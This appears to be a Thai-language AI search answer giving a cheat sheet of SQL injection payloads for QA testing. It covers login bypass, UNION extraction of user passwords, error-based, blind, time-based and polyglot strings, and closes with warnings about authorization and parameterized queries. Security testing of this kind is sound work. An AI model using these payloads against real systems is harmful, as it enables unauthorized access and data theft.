<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" style="height:64px;margin-right:32px"/>

# ตัวอย่าง payloads ที่ใช้ทดสอบ SQL injection แบบต่างๆ

นี่คือตัวอย่าง **Payloads สำหรับทดสอบ SQL Injection** ที่ Reviewer และ QA สามารถนำไปทดสอบระบบ (ใน Environment ทดสอบเท่านั้น ⚠️) เพื่อดูว่าโค้ดป้องกันได้จริงหรือไม่ แบ่งตามประเภทการโจมตี:

***

### 1. Authentication Bypass (ทะลุหน้า Login)

ใช้ทดสอบช่อง Username/Password เพื่อดูว่าจะหลุดเข้าไปโดยไม่ต้องรู้รหัสผ่านได้ไหม

* `' OR '1'='1`
* `' OR 1=1 --`
* `admin' --`
* `admin' #`
* `' OR '1'='1' -- ` (มีเว้นวรรคท้ายสุด)
* `' OR TRUE --`

**ผลลัพธ์ถ้ามีช่องโหว่:** Login สำเร็จ หรือดึงข้อมูล User คนแรกออกมาได้

***

### 2. Union-Based (ขโมยข้อมูลข้ามตาราง)

ใช้ทดสอบช่อง Search หรือ ID ใน URL เพื่อดูว่าจะดึงข้อมูลจากตารางอื่น (เช่น `users`, `passwords`) มาแปะต่อท้ายได้ไหม

* `' UNION SELECT 1, user(), database() --`
* `' UNION ALL SELECT NULL, NULL, NULL --` (ลองเพิ่ม NULL ไปเรื่อยๆ จนกว่าจะไม่ error เพื่อหาจำนวน Column)
* `1 UNION SELECT username, password FROM users --`

**ผลลัพธ์ถ้ามีช่องโหว่:** หน้าเว็บแสดงข้อมูลแปลกๆ ที่เราไม่ได้ค้นหา (เช่น ชื่อ Database หรือรายชื่อ User)

***

### 3. Error-Based (ยั่วให้ระบบคายความลับ)

ใช้ทดสอบ Input ทุกช่อง เพื่อดูว่าระบบจะเผลอพ่น Error Message ที่บอกโครงสร้าง Database ออกมาไหม

* `'` (ขีดเดียวเน้นๆ)
* `"`
* `1'`
* `1/0`
* `AND 1=CONVERT(int, (SELECT @@version)) --`

**ผลลัพธ์ถ้ามีช่องโหว่:** หน้าเว็บขึ้นหน้าจอ Error สีเหลือง/แดง พร้อมข้อความเช่น `SQLSyntaxErrorException` หรือบอกชื่อตาราง

***

### 4. Blind SQL Injection (ถาม-ตอบ ใช่หรือไม่)

ใช้เมื่อระบบไม่โชว์ Error แต่เราอยากรู้ข้อมูล โดยการถามคำถาม True/False

* `' AND 1=1 --` (ถ้าหน้าเว็บโหลดปกติ = จริง)
* `' AND 1=0 --` (ถ้าหน้าเว็บโหลดไม่เหมือนเดิม/ของหาย = เท็จ)
* `id=5 AND (SELECT 1)=1`

**ผลลัพธ์ถ้ามีช่องโหว่:** หน้าเว็บมีการเปลี่ยนแปลง (ของหาย/ของอยู่) ตามเงื่อนไขที่เราใส่ไป

***

### 5. Time-Based (สั่งให้หลับ)

ใช้ทดสอบเมื่อ Blind ธรรมดาดูไม่ออก โดยสั่งให้ Database "หน่วงเวลา" ก่อนตอบกลับ

* **MySQL:** `' AND SLEEP(5) --`
* **PostgreSQL:** `'; SELECT pg_sleep(5); --`
* **SQL Server:** `'; WAITFOR DELAY '0:0:5' --`

**ผลลัพธ์ถ้ามีช่องโหว่:** หน้าเว็บจะหมุนติ้วๆ นานผิดปกติ (เช่น 5 วินาที) ก่อนจะโหลดเสร็จ

***

### 6. Polyglot Payload (ดอกเดียวทะลุทุกค่าย)

Payload แบบครอบจักรวาลที่พยายาม Bypass หลายรูปแบบในบรรทัดเดียว

```text
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```


### ⚠️ คำเตือนสำคัญ

* **ห้ามทดสอบกับระบบ Production เด็ดขาด** (อาจทำให้เว็บล่มหรือข้อมูลเสียหาย)
* การทดสอบต้องได้รับอนุญาตอย่างเป็นลายลักษณ์อักษร
* ถ้าเจอช่องโหว่ ให้แจ้ง Developer แก้ไขด้วย **Parameterized Query** ทันที
<span style="display:none">[^1][^2][^3][^4][^5][^6][^7][^8]</span>

<div align="center">⁂</div>

[^1]: https://www.youtube.com/watch?v=iHUV_6fa2Q8

[^2]: https://www.knmasters.com/sql-injection-sqli/

[^3]: https://mayaseven.com/th/sql-injection-แฮกยังไงและถ้าเว็บเร/

[^4]: https://libdoc.dpu.ac.th/thesis/Piya.Art.pdf

[^5]: https://github.com/payloadbox/sql-injection-payload-list

[^6]: https://codinggun.com/security/sql-injection/

[^7]: https://www.iconixbkk.com/preventing-sql-injection-and-cross-site-scripting-xss-a-complete-guide-for-developers/

[^8]: https://www.reddit.com/r/netsecstudents/comments/1mkxdqy/deep_dive_into_sql_injection_my_full_technical/

